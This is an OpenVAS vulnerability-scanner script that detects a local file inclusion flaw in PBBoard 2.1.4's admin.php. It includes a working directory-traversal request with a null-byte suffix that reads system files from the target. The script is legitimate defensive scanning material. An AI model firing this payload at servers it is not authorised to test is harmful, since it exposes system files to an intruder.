##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_pbboard_page_param_lfi_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# PBBoard 'page' Parameter Local File Inclusion Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow an attacker to view files and execute local
  scripts in the context of the webserver process.
  Impact Level: Application";
tag_affected = "PBBoard version 2.1.4";
tag_insight = "The flaw is due to an improper validation of user-supplied input to
  the 'page' parameter in 'admin.php', which allows attackers to read arbitrary
  files via a ../(dot dot) sequences.";
tag_solution = "No solution or patch is available as of 01st June, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.pbboard.com";
tag_summary = "This host is running PBBoard and is prone to local file inclusion
  vulnerability.";

if(description)
{
  script_id(802631);
  script_version("$Revision: 12 $");
  script_bugtraq_id(53710);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-06-01 10:53:55 +0530 (Fri, 01 Jun 2012)");
  script_name("PBBoard 'page' Parameter Local File Inclusion Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/53710");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/75922");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18937");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/113084/pbboard-lfi.txt");
  script_xref(name : "URL" , value : "http://bot24.blogspot.in/2012/05/pbboard-version-214-suffers-from-local.html");

  script_description(desc);
  script_summary("Check if PBBoard is vulnerable to local file inclusion");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
dir = "";
url = "";
port = 0;
file = "";
files = NULL;

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Iterate over possible paths
foreach dir (make_list("", "/PBBoard", "/pbb", cgi_dirs()))
{
  url = dir + "/index.php";

  ## Confirm the application before trying exploit
  if(http_vuln_check(port: port, url: url, check_header: TRUE,
                     pattern: "Powered By PBBoard"))
  {
    files = traversal_files();
    if(! files) {
      exit(0);
    }

    foreach file (keys(files))
    {
      ## Construct attack request
      url = string(dir, "/admin.php?page=", crap(data:"../", length:3*15),
                   files[file], "%00");

      ## Try exploit and check the response to confirm vulnerability
      if(http_vuln_check(port:port, url:url, pattern:file, check_header:TRUE))
      {
        security_hole(port);
        exit(0);
      }
    }
  }
}
